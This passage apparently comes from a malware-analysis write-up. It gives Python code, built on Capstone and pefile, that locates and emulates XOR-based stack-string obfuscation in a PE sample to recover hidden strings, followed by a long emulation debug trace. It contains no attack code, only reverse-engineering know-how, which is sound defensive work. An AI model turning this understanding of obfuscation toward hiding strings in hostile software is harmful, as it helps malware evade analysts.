= bytearray(STACK_SIZE) # Create a list that will represent the registers # The list index will be the register number as defined in X86_REG_* # Example. self.reg[X86_REG_EAX] = 0x0 self.reg = [0]*X86_REG_ENDING def clear(self): self.stack = bytearray(STACK_SIZE) self.reg = [0] * X86_REG_ENDING # save data to the stack as little endian at the given offset def save_stack(self, offset, data, size): offset = offset + STACK_SIZE//2 print(f&quot;adjusting stack for ESP {hex(self.reg[X86_REG_ESP])} and offset {hex(offset)} for stack size {hex(len(self.stack))}&quot;) # Crazy hack to add in a stack pointer offset += self.reg[X86_REG_ESP] print(f&quot;saving data to stack: {data} {size}&quot;) # if offset is negative, wrap around # if offset &lt; 0: # offset = STACK_SIZE + offset # if offset + size &gt; STACK_SIZE: # offset = offset % STACK_SIZE if size == 1: self.stack[offset] = data elif size == 2: self.stack[offset:offset+2] = struct.pack(&#39;&lt;h&#39;, data) elif size == 4: if -2147483648 &lt;= data &lt;= 2147483647: self.stack[offset:offset+4] = struct.pack(&#39;&lt;i&#39;, data) else: self.stack[offset:offset+4] = struct.pack(&#39;&lt;I&#39;, data) elif size == 8: self.stack[offset:offset+8] = struct.pack(&#39;&lt;q&#39;, data) elif size == 16: self.stack[offset:offset+16] = pack_128(data) # load data from the stack as little endian at the given offset def load_stack(self, offset, size): offset = offset + STACK_SIZE//2 print(f&quot;adjusting stack for ESP {hex(self.reg[X86_REG_ESP])} and offset {hex(offset)} for stack size {hex(len(self.stack))}&quot;) # Crazy hack to add in a stack pointer offset += self.reg[X86_REG_ESP] # if offset &lt; 0: # offset = STACK_SIZE + offset # if offset + size &gt; STACK_SIZE: # offset = offset % STACK_SIZE try: if size == 1: return self.stack[offset] elif size == 2: return struct.unpack(&#39;&lt;H&#39;, self.stack[offset:offset+2])[0] elif size == 4: return struct.unpack(&#39;&lt;I&#39;, self.stack[offset:offset+4])[0] elif size == 8: return struct.unpack(&#39;&lt;Q&#39;, self.stack[offset:offset+8])[0] elif size == 16: return unpack_128(self.stack[offset:offset+16]) except: return 0 def setup_capstone(): md = Cs(CS_ARCH_X86, CS_MODE_32) md.detail = True md.skipdata = True md.syntax = CS_OPT_SYNTAX_INTEL return md # find all pxor instructions using regex, then goes up chunk size and disassembles def find_all_pxor(md: Cs, pe: pefile.PE): txt_section = pe.sections[0] txt_data = txt_section.get_data() image_base = pe.OPTIONAL_HEADER.ImageBase section_rva = txt_section.VirtualAddress pxor_egg = b&#39; x66 x0F xEF&#39; pxor_size = 6 scan_end = txt_data.rfind(pxor_egg) txt_data = txt_data[:scan_end+pxor_size] # get a chunk of instructions starting from the given offset def get_chunk(start, size): instructions = [] for inst in md.disasm(txt_data[start-size:start+pxor_size], image_base + section_rva + start + pxor_size - size): # we only care about pxor and mov instructions if inst.mnemonic == &#39;pxor&#39; or inst.mnemonic == &#39;mov&#39; or inst.mnemonic == &#39;movaps&#39;: instructions.append(inst) # skip if no instructions if len(instructions) == 0: return [] # skip if first instruction is not pxor if instructions[-1].mnemonic != &#39;pxor&#39;: return [] return instructions # get pxor chunks chunks = [] for m in re.finditer(pxor_egg, txt_data, re.DOTALL): scan_end = m.start() chunks.append(get_chunk(scan_end, CHUNK_SIZE)) return chunks #simple xor function def xor(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i % len(key)]) return bytes(out) def emulate_chunk(chunk : List[CsInsn], env: Env): inst : CsInsn # auto complete strings_out = [] for inst in chunk: regs_read, regs_write = inst.regs_access() print(f&#39;{hex(inst.address)}: {inst.mnemonic} {inst.op_str}, regs_read: {regs_read}, regs_write: {regs_write}&#39;) if inst.mnemonic == &#39;mov&#39;: # Skip array access if len(regs_read) == 3: continue # if first op is stack pointer and second op is register if len(regs_read) == 2 and inst.operands[1].type == X86_OP_REG and (regs_read[0] == X86_REG_ESP or regs_read[0] == X86_REG_EBP): #print(f&#39;0x{inst.address:x}: write {hex(env.reg[regs_read[1]])} to stack at {hex(inst.disp)}&#39;) env.save_stack(inst.disp, env.reg[regs_read[1]], inst.operands[1].size) # if first op is register and second op is stack pointer elif len(regs_read) == 1 and inst.operands[0].type == X86_OP_REG and (regs_read[0] == X86_REG_ESP or regs_read[0] == X86_REG_EBP) and len(regs_write) == 1: #print(f&#39;0x{inst.address:x}: read {hex(env.load_stack(inst.disp, inst.operands[0].size))} from stack at {hex(inst.disp)}&#39;) env.reg[regs_write[0]] = env.load_stack(inst.disp, inst.operands[0].size) # if first op is stack pointer and second op is immediate elif len(regs_read) == 1 and (regs_read[0] == X86_REG_ESP or regs_read[0] == X86_REG_EBP) and inst.operands[1].type == X86_OP_IMM: #print(f&#39;0x{inst.address:x}: write {hex(inst.operands[1].imm)} to stack at {hex(inst.disp)}&#39;) env.save_stack(inst.disp, inst.operands[1].imm, inst.operands[1].size) # if first op is register and second op is immediate elif len(regs_write) == 1 and inst.operands[1].type == X86_OP_IMM: #print(f&#39;0x{inst.address:x}: write {hex(inst.operands[1].imm)} to {hex(inst.operands[0].reg)}&#39;) env.reg[regs_write[0]] = inst.operands[1].imm # # if first op is stack pointer and second op is register # elif len(regs_read) == 2 and inst.operands[1].type == X86_OP_REG and (regs_read[0] == X86_REG_ESP or regs_read[0] == X86_REG_EBP): # #print(f&#39;0x{inst.address:x}: write {hex(env.reg[regs_read[1]])} to stack at {hex(inst.disp)}&#39;) # env.save_stack(inst.disp, env.reg[regs_read[1]], inst.operands[1].size) elif inst.mnemonic == &#39;movaps&#39;: # Skip array access if len(regs_read) == 3: continue # if first op is stack pointer and second op is register if len(regs_read) == 2 and inst.operands[1].type == X86_OP_REG and (regs_read[0] == X86_REG_ESP or regs_read[0] == X86_REG_EBP): #print(f&#39;0x{inst.address:x}: write {hex(env.reg[regs_read[1]])} to stack at {hex(inst.disp)}&#39;) env.save_stack(inst.disp, env.reg[regs_read[1]], inst.operands[1].size) # if first op is register and second op is stack pointer elif len(regs_read) == 1 and inst.operands[0].type == X86_OP_REG and (regs_read[0] == X86_REG_ESP or regs_read[0] == X86_REG_EBP) and len(regs_write) == 1: #print(f&#39;0x{inst.address:x}: read {hex(env.load_stack(inst.disp, inst.operands[0].size))} from stack at {hex(inst.disp)}&#39;) env.reg[regs_write[0]] = env.load_stack(inst.disp, inst.operands[0].size) # looking for pxor with: # &quot;pxor xmm0, xmmword ptr [esp+0x10]&quot; # &quot;pxor xmm0, xmmword ptr [ebp-0x10]&quot; # e.g. elif inst.mnemonic == &#39;pxor&#39;: # grab the two operand values val1 = env.reg[regs_read[0]] val2 = env.load_stack(inst.disp, inst.operands[1].size) #print(f&#39;0x{inst.address:x}: xor {hex(val1)} with {hex(val2)} to get {hex(val1 ^ val2)}&#39;) if val1 == 0 or val2 == 0: continue # pack them into 128 bit values data = pack_128(val1) key = pack_128(val2) out = xor(data, key) #print(f&#39;0x{inst.address:x}: xor {data} with {key} to get {out}&#39;) env.reg[regs_write[0]] = unpack_128(out) strings_out.append((inst.address, out)) # Handle push by updating the stack pointer elif inst.mnemonic == &#39;push&#39;: env.reg[X86_REG_ESP] -= 4 elif inst.mnemonic == &#39;pop&#39;: env.reg[X86_REG_ESP] += 4 else: raise Exception(f&#39;Unknown instruction {inst.mnemonic}&#39;) # strings_out = b&#39;&#39;.join(strings_out) # strings_out = strings_out.split(b&#39; x00&#39;) return strings_out # SAMPLE_PATH = &#39;/tmp/xorstr/work/rise.bin&#39; # pe = pefile.PE(SAMPLE_PATH) # md = setup_capstone() # t = time.time() # chunks = find_all_pxor(md, pe) # print(f&quot;found {len(chunks)} chunks&quot;) # env = Env() # strings = [] # # loop through each chunk and &quot;emulate&quot; it # for chunk in chunks: # if len(chunk) == 0: # continue # # extend the strings list with the strings found in this chunk # strings.extend(emulate_chunk(chunk, env)) # env.clear() # print(f&quot;Benchmark {time.time() - t}&quot;) # # hack to remove duplicates # # strings = list(dict.fromkeys(strings)) # for a, s in strings: # # tidy up some of the strings # s = s.rstrip(b&#39; x00&#39;) # s = s.decode(&#39;utf-8&#39;, &#39;ignore&#39;) # if len(s) == 0: # continue # print(f&#39;0x{a:08x}: {s}&#39;) . SAMPLE_PATH = &#39;/tmp/xorstr/work/rise.bin&#39; # Capstone setup md = Cs(CS_ARCH_X86, CS_MODE_32) md.detail = True md.skipdata = True # Get code from PE pe = pefile.PE(SAMPLE_PATH) # Assume the first section is code txt = pe.sections[0] image_base = pe.OPTIONAL_HEADER.ImageBase section_rva = txt.VirtualAddress section_offset = txt.PointerToRawData section_data = txt.get_data() pxor_vpxor_vxorps_egg = rb&#39;( x66 x0F xEF| xC5 xFD xEF| xC5 xF8 x57)&#39; chunk_offsets = [] last_end = 0 for m in re.finditer(pxor_vpxor_vxorps_egg, section_data, re.DOTALL): xor_start = m.start() # Determine the instruction length xor_instruction = list(md.disasm(section_data[xor_start:xor_start+0x10], image_base + section_rva + xor_start))[0] xor_instruction_address = image_base + section_rva + xor_start if xor_instruction.mnemonic == &#39;pxor&#39; and xor_instruction.operands[0].type == X86_OP_REG and xor_instruction.operands[1].type == X86_OP_MEM: scan_length = 0x2000 if scan_length &gt; xor_start: scan_length = xor_start if xor_start - scan_length &lt; last_end: # Update last chunk with new end chunk_offsets[-1] = (chunk_offsets[-1][0], xor_start + 10) else: chunk_offsets.append((xor_start - scan_length, xor_start + 10)) last_end = xor_start + 10 chunks = [] for chunk_offset in chunk_offsets: chunk_data = section_data[chunk_offset[0]:chunk_offset[1]] chunk_instruction_address = image_base + section_rva + chunk_offset[0] instructions = [] for inst in md.disasm(chunk_data, chunk_instruction_address): if inst.mnemonic == &#39;pxor&#39; or inst.mnemonic == &#39;mov&#39; or inst.mnemonic == &#39;movaps&#39; or inst.mnemonic == &#39;push&#39; or inst.mnemonic == &#39;pop&#39;: instructions.append(inst) chunks.append(instructions) t = time.time() print(f&quot;found {len(chunks)} chunks&quot;) env = Env() strings = [] # loop through each chunk and &quot;emulate&quot; it for chunk in chunks: if len(chunk) == 0: continue # extend the strings list with the strings found in this chunk strings.extend(emulate_chunk(chunk, env)) env.clear() print(f&quot;Benchmark {time.time() - t}&quot;) # hack to remove duplicates # strings = list(dict.fromkeys(strings)) def string_builder(strings): out = [] last_addr = 0 last_string = &quot;&quot; for s in strings[::-1]: diff = last_addr - s[0] if diff &lt;= 88 and last_string is not None: last_string = s[1] + last_string else: out.append((last_addr,last_string)) last_string = s[1] last_addr = s[0] out.append((last_addr,last_string)) return out[::-1] tmp_strings = [] for a, s in strings: # tidy up some of the strings s = s.rstrip(b&#39; x00&#39;) s = s.decode(&#39;utf-8&#39;, &#39;ignore&#39;) if len(s) == 0: continue tmp_strings.append((a,s)) strings = string_builder(tmp_strings) for a, s in strings: print(f&#39;0x{a:08x}: {s}&#39;) . found 7 chunks 0x401000: push 0x4dc1c0, regs_read: [30], regs_write: [30] 0x401005: mov ecx, 0x4f0598, regs_read: (), regs_write: [22] 0x40100f: push 0x4c7caa, regs_read: [30], regs_write: [30] 0x401019: pop ecx, regs_read: [30], regs_write: [30, 22] 0x40101b: push 0x4c7cb4, regs_read: [30], regs_write: [30] 0x401025: pop ecx, regs_read: [30], regs_write: [30, 22] 0x401027: push 2, regs_read: [30], regs_write: [30] 0x401029: push 0x4f064c, regs_read: [30], regs_write: [30] 0x401033: push 0x4c7cbe, regs_read: [30], regs_write: [30] 0x401041: push 0, regs_read: [30], regs_write: [30] 0x401043: mov ecx, 0x4f0620, regs_read: (), regs_write: [22] 0x40104d: push 0x4c7d1e, regs_read: [30], regs_write: [30] 0x401057: pop ecx, regs_read: [30], regs_write: [30, 22] 0x401059: push 0, regs_read: [30], regs_write: [30] 0x40105b: mov ecx, 0x4f06a8, regs_read: (), regs_write: [22] 0x401065: push 0x4c7d02, regs_read: [30], regs_write: [30] 0x40106f: pop ecx, regs_read: [30], regs_write: [30, 22] 0x401071: push 0, regs_read: [30], regs_write: [30] 0x401073: mov ecx, 0x4f0718, regs_read: (), regs_write: [22] 0x40107d: push 0x4c7ce6, regs_read: [30], regs_write: [30] 0x401087: pop ecx, regs_read: [30], regs_write: [30, 22] 0x401089: push 0, regs_read: [30], regs_write: [30] 0x40108b: mov ecx, 0x4f0770, regs_read: (), regs_write: [22] 0x401095: push 0x4c7cca, regs_read: [30], regs_write: [30] 0x40109f: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4010a1: push ebp, regs_read: [30, 20], regs_write: [30] 0x4010a2: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x24 and offset 0x8000 for stack size 0x10000 0x4010aa: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x4010af: mov dword ptr [esp], 0x36b7bc87, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x8000 for stack size 0x10000 saving data to stack: 918011015 4 0x4010b6: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x4010bb: mov dword ptr [esp + 4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x24 and offset 0x8004 for stack size 0x10000 saving data to stack: 896093928 4 0x4010bf: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4010c4: mov dword ptr [esp + 8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x24 and offset 0x8008 for stack size 0x10000 saving data to stack: 929680980 4 0x4010c8: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x24 and offset 0x800c for stack size 0x10000 saving data to stack: 1389027477 4 0x4010cc: movaps xmm1, xmmword ptr [esp], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x24 and offset 0x8000 for stack size 0x10000 0x4010d0: mov dword ptr [esp + 0x18], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x24 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x4010d4: mov ecx, 0x4f0750, regs_read: (), regs_write: [22] 0x4010d9: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x24 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x4010e0: mov dword ptr [esp + 0x14], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x24 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x4010e4: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x4010ec: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x24 and offset 0x8010 for stack size 0x10000 0x4010f2: push eax, regs_read: [30, 19], regs_write: [30] 0x4010f3: movaps xmmword ptr [esp + 4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x28 and offset 0x8004 for stack size 0x10000 saving data to stack: 3223088 16 0x4010fd: push 0x4c7d4e, regs_read: [30], regs_write: [30] 0x401107: pop ecx, regs_read: [30], regs_write: [30, 22] 0x401108: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x28 and offset 0x8000 for stack size 0x10000 0x40110a: pop ebp, regs_read: [30], regs_write: [30, 20] 0x40110c: push 0x4dc228, regs_read: [30], regs_write: [30] 0x401111: mov ecx, 0x4f0634, regs_read: (), regs_write: [22] 0x40111b: push 0x4c7d44, regs_read: [30], regs_write: [30] 0x401125: pop ecx, regs_read: [30], regs_write: [30, 22] 0x401127: push 0x4dc238, regs_read: [30], regs_write: [30] 0x40112c: mov ecx, 0x4f0788, regs_read: (), regs_write: [22] 0x401136: push 0x4c7d3a, regs_read: [30], regs_write: [30] 0x401140: pop ecx, regs_read: [30], regs_write: [30, 22] 0x401142: push 0x4dc278, regs_read: [30], regs_write: [30] 0x401147: mov ecx, 0x4f067c, regs_read: (), regs_write: [22] 0x401151: push 0x4c7d62, regs_read: [30], regs_write: [30] 0x40115b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x40115d: push ebp, regs_read: [30, 20], regs_write: [30] 0x40115e: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x401166: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x40116b: mov dword ptr [esp], 0x6b3a282, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 saving data to stack: 112435842 4 0x401172: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x401177: mov dword ptr [esp + 8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 saving data to stack: 929680980 4 0x40117b: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 saving data to stack: 1389027477 4 0x40117f: mov dword ptr [esp + 4], 0x35694ed8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8004 for stack size 0x10000 saving data to stack: 896093912 4 0x401187: movaps xmm1, xmmword ptr [esp], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x40118b: mov dword ptr [esp + 0x18], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x40118f: mov ecx, 0x4f06b0, regs_read: (), regs_write: [22] 0x401194: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x40119b: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x4011a3: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x4011ab: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 0x4011b1: push eax, regs_read: [30, 19], regs_write: [30] 0x402575: push 0x16, regs_read: [30], regs_write: [30] 0x402579: mov dword ptr [esp + 0x73c], 0x455526b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x873c for stack size 0x10000 saving data to stack: 1163208375 4 0x402584: mov dword ptr [esp + 0x740], 0xf4a5327f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8740 for stack size 0x10000 saving data to stack: 4104467071 4 0x40258f: mov dword ptr [esp + 0x744], 0x86182480, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8744 for stack size 0x10000 saving data to stack: 2249729152 4 0x40259a: mov dword ptr [esp + 0x748], 0x7d10fb9c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8748 for stack size 0x10000 saving data to stack: 2098264988 4 0x4025a5: mov dword ptr [esp + 0x74c], 0x317a6e8d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x874c for stack size 0x10000 saving data to stack: 830107277 4 0x4025b0: mov dword ptr [esp + 0x750], 0xa79eeff1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8750 for stack size 0x10000 saving data to stack: 2812211185 4 0x4025bb: mov dword ptr [esp + 0x754], 0xecef3336, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8754 for stack size 0x10000 saving data to stack: 3975099190 4 0x4025c6: mov dword ptr [esp + 0x758], 0xc1c786ae, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8758 for stack size 0x10000 saving data to stack: 3251078830 4 0x4025d1: mov dword ptr [esp + 0x75c], 0x22c22733, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x875c for stack size 0x10000 saving data to stack: 583149363 4 0x4025dc: mov dword ptr [esp + 0x760], 0xc1cb8123, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8760 for stack size 0x10000 saving data to stack: 3251339555 4 0x4025e7: mov dword ptr [esp + 0x764], 0xa0c8d7bc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8764 for stack size 0x10000 saving data to stack: 2697516988 4 0x4025f2: mov dword ptr [esp + 0x768], 0x5153c930, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8768 for stack size 0x10000 saving data to stack: 1364445488 4 0x4025fd: mov dword ptr [esp + 0x76c], 0x2e812ff9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x876c for stack size 0x10000 saving data to stack: 780218361 4 0x402608: mov dword ptr [esp + 0x770], 0x15454605, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8770 for stack size 0x10000 saving data to stack: 356861445 4 0x402613: mov dword ptr [esp + 0x774], 0x43b867d2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8774 for stack size 0x10000 saving data to stack: 1136158674 4 0x40261e: mov dword ptr [esp + 0x778], 0xae12aff2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8778 for stack size 0x10000 saving data to stack: 2920460274 4 0x402629: mov dword ptr [esp + 0x77c], 0x768beacf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x877c for stack size 0x10000 saving data to stack: 1988881103 4 0x402634: mov dword ptr [esp + 0x780], 0x82d454a7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8780 for stack size 0x10000 saving data to stack: 2194953383 4 0x40263f: mov dword ptr [esp + 0x784], 0x13ab0b8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8784 for stack size 0x10000 saving data to stack: 20623544 4 0x40264a: mov dword ptr [esp + 0x788], 0xca2bdd44, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8788 for stack size 0x10000 saving data to stack: 3391872324 4 0x402655: mov dword ptr [esp + 0x78c], 0x60545365, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x878c for stack size 0x10000 saving data to stack: 1616139109 4 0x402660: mov dword ptr [esp + 0x790], 0x77427ef9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8790 for stack size 0x10000 saving data to stack: 2000846585 4 0x40266b: mov dword ptr [esp + 0x794], 0xf58db7ee, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8794 for stack size 0x10000 saving data to stack: 4119705582 4 0x402676: mov dword ptr [esp + 0x798], 0xeb952556, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8798 for stack size 0x10000 saving data to stack: 3952420182 4 0x402681: mov dword ptr [esp + 0x79c], 0xd07d6e4b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x879c for stack size 0x10000 saving data to stack: 3497881163 4 0x40268c: mov dword ptr [esp + 0x7a0], 0x85542cb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87a0 for stack size 0x10000 saving data to stack: 139805387 4 0x402697: mov dword ptr [esp + 0x7a4], 0x5fc0a874, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87a4 for stack size 0x10000 saving data to stack: 1606461556 4 0x4026a2: mov dword ptr [esp + 0x7a8], 0x34a55178, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87a8 for stack size 0x10000 saving data to stack: 883249528 4 0x4026ad: mov dword ptr [esp + 0x7ac], 0x63711d31, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87ac for stack size 0x10000 saving data to stack: 1668357425 4 0x4026b8: mov dword ptr [esp + 0x7b0], 0xb6dc2f4d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87b0 for stack size 0x10000 saving data to stack: 3067883341 4 0x4026c3: mov dword ptr [esp + 0x7b4], 0x8d9e7d2a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87b4 for stack size 0x10000 saving data to stack: 2375974186 4 0x4026ce: mov dword ptr [esp + 0x7b8], 0x5bb0d3fa, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87b8 for stack size 0x10000 saving data to stack: 1538315258 4 0x4026d9: mov dword ptr [esp + 0x7bc], 0x91950d67, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87bc for stack size 0x10000 saving data to stack: 2442464615 4 0x4026e4: mov dword ptr [esp + 0x7c0], 0xd00eb28f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87c0 for stack size 0x10000 saving data to stack: 3490624143 4 0x4026ef: mov dword ptr [esp + 0x7c4], 0x7b8f5230, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87c4 for stack size 0x10000 saving data to stack: 2072990256 4 0x4026fa: mov dword ptr [esp + 0x7c8], 0x5e10b8ac, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87c8 for stack size 0x10000 saving data to stack: 1578154156 4 0x402705: mov dword ptr [esp + 0x7cc], 0x52f5423d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87cc for stack size 0x10000 saving data to stack: 1391804989 4 0x402710: mov dword ptr [esp + 0x7d0], 0x5bf6701, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87d0 for stack size 0x10000 saving data to stack: 96429825 4 0x40271b: mov dword ptr [esp + 0x7d4], 0xcb25a066, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87d4 for stack size 0x10000 saving data to stack: 3408240742 4 0x402726: mov dword ptr [esp + 0x7d8], 0x88fd3be, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87d8 for stack size 0x10000 saving data to stack: 143643582 4 0x402731: mov dword ptr [esp + 0x7dc], 0x82f9ece3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87dc for stack size 0x10000 saving data to stack: 2197417187 4 0x40273c: mov dword ptr [esp + 0x7e0], 0x7f88d933, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87e0 for stack size 0x10000 saving data to stack: 2139674931 4 0x402747: mov dword ptr [esp + 0x7e4], 0x1672a0ec, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87e4 for stack size 0x10000 saving data to stack: 376611052 4 0x402752: mov dword ptr [esp + 0x7e8], 0x9d6601c0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87e8 for stack size 0x10000 saving data to stack: 2640708032 4 0x40275d: mov dword ptr [esp + 0x7ec], 0xe43f2a9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87ec for stack size 0x10000 saving data to stack: 239334057 4 0x402768: mov dword ptr [esp + 0x7f0], 0xf1df1a15, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87f0 for stack size 0x10000 saving data to stack: 4057930261 4 0x402773: mov dword ptr [esp + 0x7f4], 0x7eb31682, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87f4 for stack size 0x10000 saving data to stack: 2125665922 4 0x40277e: mov dword ptr [esp + 0x7f8], 0x6b562b82, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87f8 for stack size 0x10000 saving data to stack: 1800809346 4 0x402789: mov dword ptr [esp + 0x7fc], 0x2c9c89ff, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x87fc for stack size 0x10000 saving data to stack: 748456447 4 0x402794: mov dword ptr [esp + 0x800], 0x31c34bb7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8800 for stack size 0x10000 saving data to stack: 834882487 4 0x40279f: mov dword ptr [esp + 0x804], 0x1001b9e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8804 for stack size 0x10000 saving data to stack: 268548584 4 0x4027aa: mov dword ptr [esp + 0x808], 0x32a68754, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8808 for stack size 0x10000 saving data to stack: 849774420 4 0x4027b5: mov dword ptr [esp + 0x80c], 0x2d634b95, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x880c for stack size 0x10000 saving data to stack: 761482133 4 0x4027c0: mov dword ptr [esp + 0x810], 0x6d458409, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8810 for stack size 0x10000 saving data to stack: 1833272329 4 0x4027cb: mov dword ptr [esp + 0x814], 0x5f98081e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8814 for stack size 0x10000 saving data to stack: 1603799070 4 0x4027d6: mov dword ptr [esp + 0x818], 0x1e34e366, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8818 for stack size 0x10000 saving data to stack: 506782566 4 0x4027e1: mov dword ptr [esp + 0x81c], 0x400493fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x881c for stack size 0x10000 saving data to stack: 1074041851 4 0x4027ec: mov dword ptr [esp + 0x820], 0x1f28365b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8820 for stack size 0x10000 saving data to stack: 522729051 4 0x4027f7: mov dword ptr [esp + 0x824], 0x4d88dd24, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8824 for stack size 0x10000 saving data to stack: 1300815140 4 0x402802: mov dword ptr [esp + 0x828], 0x86468888, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8828 for stack size 0x10000 saving data to stack: 2252769416 4 0x40280d: mov dword ptr [esp + 0x82c], 0x42eace1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x882c for stack size 0x10000 saving data to stack: 70167777 4 0x402818: mov dword ptr [esp + 0x830], 0x449978dd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8830 for stack size 